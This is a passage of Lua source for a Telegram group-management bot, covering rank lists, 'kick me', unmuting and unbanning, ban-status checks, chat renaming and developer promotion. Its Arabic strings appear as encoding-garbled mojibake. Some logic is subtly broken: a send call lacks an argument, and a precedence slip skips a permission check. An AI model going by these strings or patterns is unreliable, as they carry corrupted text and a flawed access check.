local list = database:smembers(bot_id.."Basic:Creator"..msg.chat_id_)
q = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
q = q..""..k.."- ([@"..username.."])\n"
else
q = q..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
q = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ΄Ψ¦ΩΩ Ψ§Ψ³Ψ§Ψ³ΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩ",callback_data="delasas"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,q,_key,msg.id_)

local list = database:smembers(bot_id.."Basic:Creator23"..msg.chat_id_)
w = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ§ΩΩΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
w = w..""..k.."- ([@"..username.."])\n"
else
w = w..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
w = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ§ΩΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΨ§ΩΩΩΩ",callback_data="delowner"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,w,_key,msg.id_)

local list = database:smembers(bot_id.."Creator"..msg.chat_id_)
e = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΩΨ΄Ψ¦ΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
e = e..""..k.."- ([@"..username.."])\n"
else
e = e..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
e = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΨ΄Ψ¦ΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΨ΄Ψ¦ΩΩ",callback_data="delmonsh"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,e,_key,msg.id_)

local list = database:smembers(bot_id.."Manager"..msg.chat_id_)
r = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
r = r..""..k.."- ([@"..username.."])\n"
else
r = r..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
r = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ―Ψ±Ψ§Ψ‘"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘",callback_data="delmanger"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,r,_key,msg.id_)

local list = database:smembers(bot_id.."Mod:User"..msg.chat_id_)
y = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ§Ψ―ΩΩΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
y = y..""..k.."- ([@"..username.."])\n"
else
y = y..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
y = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΨ§Ψ―ΩΩΩΩ",callback_data="delmod"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,y,_key,msg.id_)

local list = database:smembers(bot_id.."Special:User"..msg.chat_id_)
u = "\nΩ­ ΩΨ§Ψ¦ΩΨ© ΩΩΩΨ²ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
u = u..""..k.."- ([@"..username.."])\n"
else
u = u..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
u = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΩΩΨ²ΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΩΩΩΨ²ΩΩ",callback_data="delvip"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,u,_key,msg.id_)
else
send(msg.chat_id_,msg.id_,'ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΨ±ΨͺΨ¨Ω Ψ§ΩΩΨ§ΩΩ ΩΩΨ·')
end
end
if text == "ΨͺΨ§Ω ΩΩΩΩ" and Admin(msg) then
tdcli_function({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""), offset_ = 0,limit_ = 200},function(ta,mahmoud)
local t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ \nβββββββββββββ\n"
x = 0
local list = mahmoud.members_
for k, v in pairs(list) do
x = x + 1
if database:get(bot_id.."User:Name"..v.user_id_) then
t = t..""..x.." - {[@"..database:get(bot_id.."User:Name"..v.user_id_).."]}\n"
else
t = t..""..x.." - {"..v.user_id_.."}\n"
end
end
send(msg.chat_id_,msg.id_,t)
end,nil)
end

if text == "Ψ±ΨͺΨ¨ΨͺΩ" then
local rtp = database:get(bot_id.."Comd:New:rt:User:"..msg.chat_id_..msg.sender_user_id_) or Get_Rank(msg.sender_user_id_,msg.chat_id_)
send(msg.chat_id_, msg.id_,"Ω­ Ψ±ΨͺΨ¨ΨͺΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ Β» "..rtp)
end
if text == "Ψ§Ψ³ΩΩ" then 
tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
if result.first_name_ then
first_name = "Ω­ Ψ§Ψ³ΩΩ Ψ§ΩΨ§ΩΩ β {`"..(result.first_name_).."`}"
else
first_name = ""
end 
if result.last_name_ then 
last_name = "Ω­ Ψ§Ψ³ΩΩ Ψ§ΩΨ«Ψ§ΩΩ β {`"..result.last_name_.."`}" 
else
last_name = ""
end 
send(msg.chat_id_, msg.id_,first_name.."\n"..last_name) 
end,nil)
end 
if text==("ΨΉΨ―Ψ― Ψ§ΩΨ¬Ψ±ΩΨ¨") and Admin(msg) then 
if msg.can_be_deleted_ == false then 
send(msg.chat_id_,msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΩΨ§ \n") 
return false 
end 
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,ta) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
local mahmoud = "Ω­ ΨΉΨ―Ψ― Ψ§ΩΨ§Ψ―ΩΩΩΩ : "..data.administrator_count_..
"\n\nΩ­ ΨΉΨ―Ψ― Ψ§ΩΩΨ·Ψ±ΩΨ―ΩΩ : "..data.kicked_count_..
"\n\nΩ­ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ : "..data.member_count_..
"\n\nΩ­ ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΨ¬Ψ±ΩΨ¨ : "..(msg.id_/2097152/0.5)..
"\n\nΩ­ Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ : ["..ta.title_.."]"
send(msg.chat_id_, msg.id_, mahmoud) 
end,nil)
end,nil)
end 
if text == 'Ψ§Ψ·Ψ±Ψ―ΩΩ' or text == 'Ψ·Ψ±Ψ―ΩΩ' then   
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
if Rank_Checking(msg.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n *Ω­ ΨΉΨ°Ψ±Ψ§ ΩΨ§ Ψ§Ψ³ΨͺΨ·ΩΨΉ Ψ·Ψ±Ψ― ( '..Get_Rank(msg.sender_user_id_,msg.chat_id_)..' )*')
return false
end
_key = {
{{text="ΨͺΨ£ΩΩΨ― Ψ§ΩΨ§ΩΨ±",callback_data="OkKikedMe"..msg.sender_user_id_},{text="Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ±",callback_data="noKikedMe"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_," *Ω­ ΩΩ Ψ¨ΨͺΨ£ΩΩΨ― Ψ§ΩΨΉΩΩΩΩ Ψ§ΩΨ§Ω*",_key,msg.id_)
return false
else
send(msg.chat_id_, msg.id_,' *Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± Ψ§Ψ·Ψ±Ψ―ΩΩ*') 
end
end

if text == 'ΨͺΩΨΉΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ' and Manger(msg) then   
if database:get(bot_id..'Cick:Me'..msg.chat_id_) then
Text = ' *Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± Ψ§Ψ·Ψ±Ψ―ΩΩ*'
database:del(bot_id..'Cick:Me'..msg.chat_id_)  
else
Text = ' *Ω­ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± Ψ§Ψ·Ψ±Ψ―ΩΩ*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΨͺΨΉΨ·ΩΩ Ψ§Ψ·Ψ±Ψ―ΩΩ' and Manger(msg) then  
if not database:get(bot_id..'Cick:Me'..msg.chat_id_) then
database:set(bot_id..'Cick:Me'..msg.chat_id_,true)  
Text = '\n *Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± Ψ§Ψ·Ψ±Ψ―ΩΩ*'
else
Text = '\n *Ω­ Ψ¨Ψ§ΩΨͺΨ§ΩΩΨ― ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± Ψ§Ψ·Ψ±Ψ―ΩΩ*'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'ΨͺΩΨΉΩΩ ΩΩΩ ΨΆΨ§ΩΩΩ' and Manger(msg) then 
database:del(bot_id..'Lock:Added:Me'..msg.chat_id_) 
send(msg.id_,'Ω­ ΨͺΩ ΨͺΩΨΉΩΩ Ψ§ΩΨ± ΩΩΩ ΨΆΨ§ΩΩΩ') 
return false
end
if text == 'ΨͺΨΉΨ·ΩΩ ΩΩΩ ΨΆΨ§ΩΩΩ' and Manger(msg) then 
database:set(bot_id..'Lock:Added:Me'..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_,'Ω­ ΨͺΩ ΨͺΨΉΨ·ΩΩ Ψ§ΩΨ± ΩΩΩ ΨΆΨ§ΩΩΩ') 
return false
end

if text and text:match("(.*)(ΩΩΩ ΨΆΨ§ΩΩΩ)(.*)") then
if not database:get(bot_id..'Lock:Added:Me'..msg.chat_id_) then
tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
if da and da.status_.ID == "ChatMemberStatusCreator" then
send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΨͺ ΩΩΨ΄Ψ¦ Ψ§ΩΩΨ¬ΩΩΨΉΩ ') 
return false
end
local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sender_user_id_)
if Added_Me then 
tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
Text = 'Ω­ Ψ§ΩΨ΄Ψ?Ψ΅ Ψ§ΩΨ°Ω ΩΨ§Ω Ψ¨Ψ§ΨΆΨ§ΩΨͺΩ ΩΩ Β» '..Name
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)
else
send(msg.chat_id_, msg.id_,'Ψ§ΩΨͺ Ψ―Ψ?ΩΨͺ ΨΉΨ¨Ψ± Ψ§ΩΨ±Ψ§Ψ¨Ψ· ΩΨ­Ψ―Ψ΄ ΨΆΨ§ΩΩ') 
end
end,nil)
else
send(msg.chat_id_, msg.id_,'Ω­ Ψ§ΩΨ± ΨΆΨ§ΩΩΩ ΨͺΩ ΨͺΨΉΨ·ΩΩΩ ΩΩ ΩΨ¨Ω Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ ') 
end
end
if text and text:match("^Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ― @(.*)") and Manger(msg) then 
local username = text:match("^Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ― @(.*)") 
function Function_Tshake(extra, result, success)
if result.id_ then
if DevSonic(msg) then
database:srem(bot_id.."Gmute:User",result.id_)
database:srem(bot_id.."GBan:User",result.id_)
database:srem(bot_id.."Ban:User"..msg.chat_id_,result.id_)
database:srem(bot_id.."Muted:User"..msg.chat_id_,result.id_)
usertext = "\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..result.title_.."](t.me/"..(username or "kenwa")..")"
status = "\nΩ­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΩΨ― ΨΉΩΩ"
texts = usertext..status
send(msg.chat_id_, msg.id_,texts)
else
database:srem(bot_id.."Ban:User"..msg.chat_id_,result.id_)
database:srem(bot_id.."Muted:User"..msg.chat_id_,result.id_)
Reply_Status(msg,result.id_,"reply","\nΩ­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΩΨ― ΨΉΩΩ") 
end
else
Text = "Ω­ Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ·"
send(msg.chat_id_, msg.id_,Text)
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
end
if text == "Ψ±ΩΨΉ Ψ§ΩΩΩΩΨ―" and Manger(msg) then
function Function_Tshake(extra, result, success)
if DevSonic(msg) then
database:srem(bot_id.."Gmute:User",result.sender_user_id_)
database:srem(bot_id.."GBan:User",result.sender_user_id_)
database:srem(bot_id.."Ban:User"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Muted:User"..msg.chat_id_,result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply","\nΩ­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΩΨ― ΨΉΩΩ") 
else
database:srem(bot_id.."Ban:User"..msg.chat_id_,result.sender_user_id_)
database:srem(bot_id.."Muted:User"..msg.chat_id_,result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = "\nΩ­ Ψ§ΩΨΉΨΆΩ Β» ["..data.first_name_.."](t.me/"..(data.username_ or "kenwa")..")"
status = "\nΩ­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΩΩΩΨ― ΨΉΩΩ"
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
end
if text and text:match("^ΩΨ΄Ω Ψ§ΩΩΩΩΨ― @(.*)") and Manger(msg) then 
local username = text:match("^ΩΨ΄Ω Ψ§ΩΩΩΩΨ― @(.*)") 
function Function_Tshake(extra, result, success)
if result.id_ then
if database:sismember(bot_id.."Muted:User"..msg.chat_id_,result.id_) then
Muted = "ΩΩΨͺΩΩ"
else
Muted = "ΨΊΩΨ± ΩΩΨͺΩΩ"
end
if database:sismember(bot_id.."Ban:User"..msg.chat_id_,result.id_) then
Ban = "ΩΨ­ΨΈΩΨ±"
else
Ban = "ΨΊΩΨ± ΩΨ­ΨΈΩΨ±"
end
if database:sismember(bot_id.."GBan:User",result.id_) then
GBan = "ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω"
else
GBan = "ΨΊΩΨ± ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω"
end
if database:sismember(bot_id.."Gmute:User",result.id_) then
Gmute = "ΩΩΨͺΩΩ ΨΉΨ§Ω"
else
Gmute = "ΨΊΩΨ± ΩΩΨͺΩΩ ΨΉΨ§Ω"
end
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ­ΨΈΨ± Ψ§ΩΨΉΨ§Ω Β» "..GBan.."\nΩ­ Ψ§ΩΩΨͺΩ Ψ§ΩΨΉΨ§Ω Β» "..Gmute.."\nΩ­ Ψ§ΩΨ­ΨΈΨ± Β» "..Ban.."\nΩ­ Ψ§ΩΩΨͺΩ Β» "..Muted)
else
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΩΨΉΨ±Ω ΨΊΩΨ·")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Tshake, nil)
end

if text == "ΩΨ΄Ω Ψ§ΩΩΩΩΨ―" and Manger(msg) then 
function Function_Tshake(extra, result, success)
if database:sismember(bot_id.."Muted:User"..msg.chat_id_,result.sender_user_id_) then
Muted = "ΩΩΨͺΩΩ"
else
Muted = "ΨΊΩΨ± ΩΩΨͺΩΩ"
end
if database:sismember(bot_id.."Ban:User"..msg.chat_id_,result.sender_user_id_) then
Ban = "ΩΨ­ΨΈΩΨ±"
else
Ban = "ΨΊΩΨ± ΩΨ­ΨΈΩΨ±"
end
if database:sismember(bot_id.."GBan:User",result.sender_user_id_) then
GBan = "ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω"
else
GBan = "ΨΊΩΨ± ΩΨ­ΨΈΩΨ± ΨΉΨ§Ω"
end
if database:sismember(bot_id.."Gmute:User",result.sender_user_id_) then
Gmute = "ΩΩΨͺΩΩ ΨΉΨ§Ω"
else
Gmute = "ΨΊΩΨ± ΩΩΨͺΩΩ ΨΉΨ§Ω"
end
Textt = "Ω­ Ψ§ΩΨ­ΨΈΨ± Ψ§ΩΨΉΨ§Ω Β» "..GBan.."\nΩ­ Ψ§ΩΩΨͺΩ Ψ§ΩΨΉΨ§Ω Β» "..Gmute.."\nΩ­ Ψ§ΩΨ­ΨΈΨ± Β» "..Ban.."\nΩ­ Ψ§ΩΩΨͺΩ Β» "..Muted..""
send(msg.chat_id_, msg.id_,Textt)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Tshake, nil)
end

if text and text:match("^ΨΆΨΉ Ψ§Ψ³Ω (.*)") and Manger(msg) or text and text:match("^ΩΨΆΨΉ Ψ§Ψ³Ω (.*)") and Manger(msg) then 
local Name = text:match("^ΨΆΨΉ Ψ§Ψ³Ω (.*)") or text:match("^ΩΨΆΨΉ Ψ§Ψ³Ω (.*)") 
tdcli_function ({ ID = "ChangeChatTitle",chat_id_ = msg.chat_id_,title_ = Name },function(arg,data) 
if data.message_ == "Channel chat title can be changed by administrators only" then
send(msg.chat_id_,msg.id_,"Ω­ Ψ§ΩΨ¨ΩΨͺ ΩΩΨ³ Ψ§Ψ―ΩΩ ΩΨ±Ψ¬Ω ΨͺΨ±ΩΩΨͺΩ !") 
return false 
end 
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"Ω­ ΩΩΨ³Ψͺ ΩΨ―Ω Ψ΅ΩΨ§Ψ­ΩΨ© ΨͺΨΊΩΨ± Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
else
send(msg.chat_id_,msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΩΨ± Ψ§Ψ³Ω Ψ§ΩΩΨ¬ΩΩΨΉΩ Ψ§ΩΩ {["..Name.."]}") 
end
end,nil) 
end

if text ==("Ψ±ΩΨΉ Ψ§ΩΨ§Ψ―ΩΩΩΩ") and Manger(msg) then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local num2 = 0
local admins = data.members_
for i=0 , #admins do
if data.members_[i].bot_info_ == false and data.members_[i].status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
num2 = num2 + 1
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,b) 
if b.username_ == true then
end
if b.first_name_ == false then
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end,nil) 
else
database:srem(bot_id.."Mod:User"..msg.chat_id_, admins[i].user_id_)
end
end
if num2 == 0 then
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΨͺΩΨ¬Ψ― Ψ§Ψ―ΩΩΩΨ© ΩΩΨͺΩ Ψ±ΩΨΉΩΩ") 
else
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩΨͺ ΨͺΨ±ΩΩΨ© { "..num2.." } ΩΩ Ψ§Ψ―ΩΩΩΨ© Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
end
end,nil) 
end
---by-7oda-sonic
if text == ("Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and DevSonic(msg) then
function Function_Mahmoud(extra, result, success)
database:sadd(bot_id.."DEV:Sudo:T", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply"," Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Mahmoud, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$") and DevSonic(msg) then
local username = text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$")
function Function_Mahmoud(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," Ω­ ΨΉΨ°Ψ±Ψ§ ΨΉΨ²ΩΨ²Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω ΩΨ§Ψ°Ψ§ ΩΨΉΨ±Ω ΩΩΨ§Ψ© ΩΨ±Ψ¬Ω Ψ§Ψ³ΨͺΨ?Ψ―Ψ§Ω Ψ§ΩΨ§ΩΨ± Ψ¨Ψ΅ΩΨ±Ω Ψ΅Ψ­ΩΨ­Ω !") 
return false 
end 
database:sadd(bot_id.."DEV:Sudo:T", result.id_)
Reply_Status(msg,result.id_,"reply"," Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
else
send(msg.chat_id_, msg.id_," Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Mahmoud, nil)
return false 
end
if text and text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$") and DevSonic(msg) then
local userid = text:match("^Ψ±ΩΨΉ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$")
database:sadd(bot_id.."DEV:Sudo:T", userid)
Reply_Status(msg,userid,"reply"," Ω­ ΨͺΩ ΨͺΨ±ΩΩΨͺΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ ΩΩ Ψ§ΩΨ¨ΩΨͺ") 
return false 
end
if text == ("ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ") and tonumber(msg.reply_to_message_id_) ~= 0 and DevSonic(msg) then
function Function_Mahmoud(extra, result, success)
database:srem(bot_id.."DEV:Sudo:T", result.sender_user_id_)
Reply_Status(msg,result.sender_user_id_,"reply"," Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩΩΩ") 
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_Mahmoud, nil)
return false 
end
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$") and DevSonic(msg) then
local username = text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ @(.*)$")
function Function_Mahmoud(extra, result, success)
if result.id_ then
database:srem(bot_id.."DEV:Sudo:T", result.id_)
Reply_Status(msg,result.id_,"reply"," Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩΩΩ") 
else
send(msg.chat_id_, msg.id_," Ω­ ΩΨ§ ΩΩΨ¬Ψ― Ψ­Ψ³Ψ§Ψ¨ Ψ¨ΩΨ§Ψ°Ψ§ Ψ§ΩΩΨΉΨ±Ω")
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_Mahmoud, nil)
return false
end 
if text and text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$") and DevSonic(msg) then
local userid = text:match("^ΨͺΩΨ²ΩΩ ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ (%d+)$")
database:srem(bot_id.."DEV:Sudo:T", userid)
Reply_Status(msg,userid,"reply"," Ω­ ΨͺΩ ΨͺΩΨ²ΩΩΩ ΩΩ Ψ§ΩΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩΩΩ") 
return false 
end
if text == ("Ψ§ΩΨ«Ψ§ΩΩΩΩΩ") and DevSonic(msg) then
local list = database:smembers(bot_id.."DEV:Sudo:T")
t = "\n Ω­ ΩΨ§Ψ¦ΩΨ© ΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ ΩΩΨ¨ΩΨͺ \n βͺββββββπ³π΄π±πΎ β« βββββββ« \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = " Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ·ΩΨ±ΩΩ Ψ«Ψ§ΩΩΩΩΩ"
end
_key = {
{{text="ΩΨ³Ψ­ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ",callback_data="deldevsall"..msg.sender_user_id_}},
}
send_inlin_key(msg.chat_id_,t,_key,msg.id_)
return false  
end
if text == ("ΩΨ³Ψ­ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ") and DevSonic(msg) then
database:del(bot_id.."DEV:Sudo:T")
send(msg.chat_id_, msg.id_, "\n Ω­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ·ΩΨ±ΩΩ Ψ§ΩΨ«Ψ§ΩΩΩΩΩ ")
end
if text == ("ΩΨ³Ψ­ Ψ§ΩΩΨ―ΩΨ±ΩΩ ΨΉΨ§Ω") and Devss(msg) then
database:del(bot_id.."manger:all")
send(msg.chat_id_, msg.id_, "\nΩ­ ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ―ΩΨ±ΩΩ ΨΉΨ§Ω ")
end
if text == ("Ψ§ΩΩΨ―ΩΨ±ΩΩ ΨΉΨ§Ω") or text == ("Ψ§ΩΩΨ―ΩΨ±ΩΩ Ψ§ΩΨΉΨ§Ω") and Devss(msg) then
local list = database:smembers(bot_id.."manger:all")
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΩΨ―ΩΨ±ΩΩ ΨΉΨ§Ω \nβ β β β β β β β β \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."User:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΩΩΨ¬Ψ― ΩΨ―ΩΨ±ΩΩ ΨΉΨ§Ω"
end
send(msg.chat_id_, msg.id_, t)
end
------
if text ==("Ψ§ΩΩΩΨ΄Ψ¦") then
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data) 
local admins = data.members_
for i=0 , #admins do
if data.members_[i].status_.ID == "ChatMemberStatusCreator" then
owner_id = admins[i].user_id_
tdcli_function ({ID = "GetUser",user_id_ = owner_id},function(arg,b) 
if b.first_name_ == false then
send(msg.chat_id_, msg.id_,"Ω­ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΩΩΨ΄Ψ¦ ΩΨ­Ψ°ΩΩ")
return false  
end
local UserName = (b.username_ or "otlop12")
Text = "Ω­ ΩΩΨ΄Ψ¦ Ψ§ΩΩΨ¬ΩΩΨΉΩ ~ ["..b.first_name_.."](tg://user?id="..b.id_..")"
sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
end,nil)   
end
end
end,nil)   
end
